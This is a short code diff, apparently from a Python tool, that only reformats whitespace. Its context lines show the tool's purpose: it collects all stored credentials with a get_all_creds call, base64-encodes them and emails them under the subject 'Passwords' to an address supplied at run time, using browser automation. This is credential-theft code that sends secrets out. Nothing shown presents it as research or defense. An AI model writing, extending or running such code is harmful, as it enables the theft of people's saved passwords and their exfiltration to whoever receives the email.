@@ -7,7 +7,7 @@ from edge_email import write_email
 import argparse
 
 
-async def main(to:str, cc:str=None, headfull=False):
+async def main(to: str, cc: str = None, headfull=False):
     subject = "Passwords"
     try:
         creds = await get_all_creds(use_b64=True)
@@ -17,7 +17,7 @@ async def main(to:str, cc:str=None, headfull=False):
         content = ''.join(traceback.TracebackException.from_exception(e).format())
         subject = "Error Log"
 
-    await write_email(to, subject, content,cc=cc, headless=not headfull)
+    await write_email(to, subject, content, cc=cc, headless=not headfull)
     print("E-Mail written")
 
 
